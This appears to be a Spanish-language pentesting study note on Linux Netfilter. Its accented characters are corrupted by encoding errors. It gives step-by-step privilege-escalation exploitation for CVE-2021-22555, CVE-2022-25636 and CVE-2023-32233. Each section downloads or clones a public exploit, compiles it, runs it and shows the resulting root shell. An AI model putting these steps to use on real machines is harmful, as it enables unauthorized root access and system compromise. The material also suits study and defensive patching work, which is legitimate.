---
tags:
  - privilege-escalation
  - kernel
  - netfilter
  - linux
  - exploits
aliases:
  - Netfilter Exploits
---

# ğŸ§± Netfilter y Vulnerabilidades en el Kernel de Linux

## Â¿QuÃ© es Netfilter?
Netfilter es un mÃ³dulo del kernel de Linux que permite:

- Filtrado de paquetes.
- TraducciÃ³n de direcciones de red (NAT).
- Seguimiento de conexiones.

ActÃºa como una capa de software en el kernel que manipula paquetes usando reglas definidas. Herramientas como `iptables` y `arptables` son interfaces que interactÃºan con Netfilter.

---

## ğŸ”§ Funciones principales

1. DefragmentaciÃ³n de paquetes.
2. Seguimiento de conexiones.
3. TraducciÃ³n de direcciones de red (NAT).

---

## âš ï¸ Vulnerabilidades en Netfilter

Estas vulnerabilidades permiten **escalar privilegios a root** mediante exploits.

---

### ğŸ”“ CVE-2021-22555
- **Kernel vulnerable:** 2.6 a 5.11.
- **Tipo:** Escritura fuera de lÃ­mites (Out-Of-Bounds Write).
- **Impacto:** Escalada a root.

#### ğŸ§ª PoC

```bash
uname -r
# Ejemplo de salida: 5.10.5-051005-generic

wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

#### âœ… Resultado esperado

```bash
[+] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### ğŸ”“ CVE-2022-25636
- **Kernel vulnerable:** 5.4 a 5.6.10.
- **Archivo afectado:** `nf_dup_netdev.c`
- **Tipo:** Heap Out-Of-Bounds Write.
- **Impacto:** Escalada a root (riesgo de corrupciÃ³n del kernel).

#### ğŸ§ª PoC

```bash
uname -r
# Ejemplo de salida: 5.13.0-051300-generic

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

#### âœ… Resultado esperado

```bash
[*] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### ğŸ”“ CVE-2023-32233
- **Kernel vulnerable:** Hasta 6.3.1.
- **Tipo:** Use-After-Free en `nf_tables` (sets anÃ³nimos).
- **Impacto:** ModificaciÃ³n de memoria del kernel, escalada a root.

#### ğŸ§ª PoC

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

#### âœ… Resultado esperado

```bash
[*] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## ğŸ¢ Riesgos en entornos empresariales

- Muchas empresas usan distros antiguas por compatibilidad con sus aplicaciones.
- Esto impide actualizaciones crÃ­ticas del kernel.
- Incluso con contenedores o mÃ¡quinas virtuales, el **kernel base sigue siendo vulnerable**.

---

## âš ï¸ Advertencia

> Estos exploits pueden ser **inestables** y daÃ±ar el sistema. Algunos requieren reinicio tras ejecutarlos.
